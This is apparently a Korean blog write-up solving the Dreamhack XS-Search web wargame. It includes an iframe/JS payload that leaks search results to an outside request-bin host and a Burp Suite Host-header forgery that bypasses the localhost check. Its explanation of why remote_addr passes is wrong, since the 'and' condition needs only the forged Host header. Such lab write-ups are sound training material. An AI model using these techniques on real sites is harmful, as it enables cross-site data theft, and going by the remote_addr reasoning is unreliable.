---
title: "드림핵 lv.3 - XS-Search"
date: 2025-03-28 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, xs-search] 
description: 드림핵 XS-Search 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/443/](https://dreamhack.io/wargame/challenges/443/)
# 문제 설명
Exercise: XS-Search에서 실습하는 문제입니다.

플래그는 `DH{[0123456789abcdef]{32}}`의 포맷입니다.

---
# 문제 풀이
## 웹사이트 분석
### / 페이지
메인 페이지에는 특별하는 것이 없고 그냥 search 페이지와 submit 페이지로 이동하는 `<a>` 태그들만 있다.
### /search 페이지
해당 페이지에는 어떠한 것을 검색할 수 있는 기능이 있고 예시로 "DreamHack"이라고 검색을 하면 어떠한 해당 문자열을 포함한 iframe 창이 뜬다. <br />
다른 문자열로 검색을 하면 "something not found"라는 문구가 뜨게된다.
### /submit 페이지
URL 주소를 하나 받는 input box가 있다.<br />
어떠한 페이지를 Report하는 기능인 것 같은데 이것만 봐서는 어떤 방식인지 상상이 안간다.
## 코드 분석
### app.py
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
from selenium.common.exceptions import TimeoutException
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from hashlib import md5
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

notes = {
    (FLAG, True), 
    ("Hello World", False), 
    ("DreamHack", False), 
    ("carpe diem, quam minimum credula postero", False)
}

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get(url)
    except TimeoutException as e:
        driver.quit()
        return True
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

@app.route("/")
def index():
    return render_template('index.html')

@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note)
    return render_template("search.html", query=query, result=None)

@app.route("/submit", methods=["GET", "POST"])
def submit():
    if request.method == "GET":
        return render_template("submit.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        if not urlparse(url).scheme.startswith("http"):
            return '<script>alert("wrong url");history.go(-1);</script>'
        if not read_url(url):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

app.run(host="0.0.0.0", port=8000)
```
이번 문제의 핵심이 되는 서버 코드이다.<br />
#### notes
가장 먼저 플래그가 어디있는지 살펴보면 초반부의 notes라는 set이 보인다. 그리고 4개의 튜플이 안에 있는 구조이다.<br />
튜플의 첫 번째 값은 노트의 제목인 듯하고 그 뒤의 Boolean 값은 다른 부분들을 보았을 때 private 노트냐 아니냐의 여부를 나타내는 것 같다.<br />

플래그를 제외한 나머지 노트들은 모두 public 노트들이어서 아무나 접근이 가능해보인다.<br />
실제로 /search 페이지에서 "Hello World", "DreamHack", "carpe diem, quam minimum credula postero"를 입력했을 때 올바르게 노트를 읽어오는 모습이 확인된다.
#### /search 라우터
```python
@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note)
    return render_template("search.html", query=query, result=None)
```
/search 페이지의 백엔드 코드를 담당하는 부분이다.<br />
query라는 값을 유저로부터 받아서 아까 살펴봤던 notes들 중 제목이 일치하는지 체크하고 일치한다면 결과를 보여주고 아니라면 None을 리턴한다.<br />

여기서 주목해야할 점은 노트가 private일 때 127.0.0.1 주소로 접근하는 것이 아니라면 접근할 수 없도록 하고있다. 즉, 어떠한 비밀번호를 입력해야 접근할 수 있는 것이 아니라 127.0.0.1로 접근해야 하는 듯 하다.<br />
#### /submit 라우터
```python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    if request.method == "GET":
        return render_template("submit.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        if not urlparse(url).scheme.startswith("http"):
            return '<script>alert("wrong url");history.go(-1);</script>'
        if not read_url(url):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```
/submit 페이지의 동작이다.<br />
url 값을 받아와서 "http"라는 문자로 시작하는지 체크하고 read_url()이라는 함수를 통해서 해당 URL에 접근하는 것으로 보인다.<br />
#### read_url()
```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get(url)
    except TimeoutException as e:
        driver.quit()
        return True
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True
```
read_url() 함수는 이렇게 생겼는데 인자로 받은 url에 접근하여 접근 상태에 따라서 Boolean 값을 리턴한다.
## 최종 풀이
코드와 웹사이트를 전체적으로 분석해봤을 때, 문제 제목에 나와있듯이 XS-Search 취약점이 존재한다는 것을 알 수 있다.<br />
/search 페이지에서 검색을 할 때에 정확하게 해당 노트의 이름을 입력할 필요 없이 그냥 검색어가 note 제목에 포함이 됐냐 아니냐를 판단하기 때문에 예를 들어 "D"라고만 입력해도 "DreamHack" 노트를 화면에 출력한다.<br />

즉, 로컬호스트로 /search에 접근하여 플래그 노트의 제목을 하나씩 확인할 수 있다는 것이다.<br />
만약 플래그 노트의 값이 DH{abcd}라고 한다면 DH{a, DH{aa, DH{ab, 이런식으로 한 글자 한 글자 비교하면서 원래의 플래그를 알아낼 수 있다는 것이다.<br />
### 어떻게 플래그가 검색됐다는 것을 알아낼까?
여기서 다양한 방법이 쓰일 수 있다.<br />
단순하게 화면에 "not found"가 출력되지 않은 것을 가지고 판단을 할 수도 있고 iframe이 있냐 없냐로 판단을 할 수도 있다.<br />

여기서는 iframe의 여부 판단 방식을 사용할 것이다.<br />
### iframe 여부 판단 테스트
```html
<iframe id="iframe"></iframe>
<img id="img">

<script>
    var iframe = document.getElementById("iframe");
    iframe.src = "https://127.0.0.1:8000/search?query=DreamHack";

    iframe.onload = () => {
        var num = iframe.contentWindow.frames.length;
        img.src = `https://oydpwsg.request.dreamhack.games/${num}`
    }
</script>
```
해당 코드를 서버에 올리고 그 서버의 URL 주소를 /submit 페이지에 제출하면 드림핵의 Request Bin에서 1이라는 숫자를 리턴받을 수 있다. 1이라는 것은 iframe 창의 개수이고 쿼리 값을 "DreamHack"으로 설정했기 때문에 검색에 성공하여 노트가 출력됐다는 의미이다.<br />
### 자동화 프로그램으로 최종 플래그 알아내기
내가 직접 구현하기에는 좀 귀찮에서 드림핵에서 제공하는 코드를 사용하였다.<br />
해당 코드는 [여기](https://learn.dreamhack.io/338#5)에서 확인할 수 있다.<br />

코드를 실행하면 시간이 좀 걸리지만 모든 과정이 끝나고 Request Bin을 확인해보면 플래그 값을 확인할 수 있다.
## 또 다른 풀이
```python
@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note)
    return render_template("search.html", query=query, result=None)
```
/search 라우터를 다시 살펴보면 private 노트를 처리하는 부분이 좀 이상하다는 것을 알 수 있다.<br />

단지 request의 header 중 HOST 값이 "127.0.0.1:8000"인지 확인하고 맞다면 통과시켜준다.<br />
일반적인 브라우저에서는 이 HOST 값을 수정하는 기능이 막혀있다. 그래서 Burp Suite 같은 프록시 툴을 이용해서 바꿔주면 된다.<br />
### Burp Suite 풀이
1. /search 페이지에 접속한다.
2. Burp Suite를 켜서 Proxy 탭에 들어가 interceptor을 활성화 시킨다.
3. /search 페이지에서 "DH{"를 입력하고 search 버튼을 누른다.
4. 다시 Burp Suite의 Proxy 탭으로 돌아가 아래쪽의 Request칸에서 Host 값을 `host3.dreamhack.games:14547` -> `127.0.0.1:8000`으로 변경해서 Forward한다.
5. 그러면 /search 페이지에서 플래그가 출력된 것을 볼 수 있다.
#### remote_addr?
```js
if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
```
위 코드에서 해당 조건식을 다시 한 번 보면 `request.headers.get` 뿐만 아니라 `request.remote_addr`의 값도 "127.0.0.1"인지 확인하는 부분이 함께있다.<br />

Burp Suite 프록시로 Host 값을 조작할 때에 remote_addr과 관련된 값은 건드리지도 않았는데 이게 왜 통과되는지 의아할 수도 있을 것 같아 언급하였다.<br />

remote_addr은 요청을 보내는 클라이언트의 IP 주소이다. <br />
내 IP 주소는 당연하게도 "127.0.0.1"이 아니지만 Burp Suite 같은 프록시를 브라우저와 연결할 때 보통 로컬호스트로 연결하기 때문에 그렇다. 프록시 툴을 사용해본 사람이라면 무슨 말인지 이해가 갈 것이라고 생각한다.<br />

그렇기 때문에 우리가 어떠한 조치를 취하지 않아도 자동으로 remote_addr 값이 로컬호스트 주소로 설정되는 것이다.
# 배운 것
XS-Search는 Blind SQL Injection과 비슷한 방식으로 값을 알아내는 공격 방법이다.<br />
해당 문제를 통해서 iframe의 개수를 체크하는 아이디어를 얻을 수 있었다.<br />

그리고 remote_addr 같은 값에 대해서도 공부할 수 있었다.